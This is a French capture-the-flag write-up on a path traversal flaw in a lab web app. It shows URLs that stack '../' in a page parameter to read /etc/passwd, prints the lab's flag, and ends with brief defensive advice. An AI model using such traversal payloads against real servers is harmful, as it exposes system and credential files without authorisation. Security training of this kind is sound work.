# Path traversal

## Trouver la faille :

En allant sur l'URL `http://192.168.86.43/index.php?page=../` on obtiens le message `Wtf ?`

En allant sur l'URL `http://192.168.86.43/index.php?page=../../` on obtiens le message `Wrong..`

En allant sur l'URL `http://192.168.86.43/index.php?page=../../../` on obtiens le message `Nope..`

En allant sur l'URL `http://192.168.86.43/index.php?page=../../../../` on obtiens le message `Almost.`

En allant sur l'URL `http://192.168.86.43/index.php?page=../../../../../` on obtiens le message `Still nope..`

En allant sur l'URL `http://192.168.86.43/index.php?page=../../../../../../` on obtiens le message `Nope..`

En allant sur l'URL `http://192.168.86.43/index.php?page=../../../../../../../` et au delà (rajouter toujours plus de `../`) on obtiens le message `You can DO it !!! :]`

Il y a clairement un truc à creuser !

On se doute qu'on va pouvoir aller taper dans des dossiers et fichiers qui nous intéressent. En l'occurrence, on aimerait bien récupérer la liste des users et des passwords, sur un Linux on sait qu'on a un fichier `/etc/passwd` qui pourrait convenir. 
On tente donc de remonter les dossiers en tapant sur `/etc/passwd`. 

On arrive sur `http://192.168.86.43/?page=../../../../../../../etc/passwd` et bingo ! !

The flag is : `b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`

## S'en prémunir :

Sur un site internet, on a souvent envie de bloquer l'utilisation de certaines pages aux clients comme la page admin par exemple. Dans le cas d'une attaque `Path Traversal` le hacker souhaite surtout accéder au filesystem du serveur pour y récupérer des fichiers.

Plusieurs solutions pour s'en prémunir:

**1 - .htaccess**

Afin d'empêcher que n'importe qui accède à des pages on peut très facilement créer une protection par login/mot de passe qui empêche l'accès à tous les fichiers du dossier.

C'est le fichier .htaccess qui permet de dire au serveur qui a le droit d'y accéder ou non.

**2 - Vérifier le role de l'utilisateur**

En effet, au travers des roles définis, des tokens ou des sessions il est facile d'identifier si un utilisateur a accès ou non à une page.

**3 - Toujours parser les données**

Il est très important de toujours parser les données reçues afin de limiter certains caracteres. De maniere générale, il est impératif de vérifier ce que l'utilisateur nous envoie et de réécrire ces données en les sécurisants.